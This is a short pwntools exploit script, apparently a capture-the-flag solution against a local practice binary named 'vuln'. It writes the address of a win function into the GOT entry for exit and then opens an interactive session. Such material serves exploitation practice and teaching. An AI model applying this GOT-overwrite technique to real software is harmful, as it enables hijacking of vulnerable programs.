from pwn import *

elf = ELF('../vuln')

r = process('../vuln')
r.sendline(b'y')
r.sendline(str(elf.functions['give_the_man_a_guitar'].address))
r.sendline(str(elf.got['exit']))
r.interactive()